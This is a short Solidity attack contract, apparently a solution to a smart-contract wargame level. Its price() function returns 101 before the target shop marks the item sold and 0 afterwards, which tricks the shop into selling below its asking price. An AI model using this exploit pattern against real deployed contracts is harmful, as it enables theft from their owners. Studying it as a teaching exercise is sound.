// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract Buyer {
    address public shopAddr;

    function price() public view returns (uint256) {
        Shop shop = Shop(shopAddr);
        bool isSold = shop.isSold();
        if (!isSold) {
            return 101;
        } else {
            return 0;
        }
    }

    function buy(address addr) public payable {
        shopAddr = addr;
        (bool success, bytes memory data) = shopAddr.call(abi.encodeWithSignature("buy()"));
    }
}
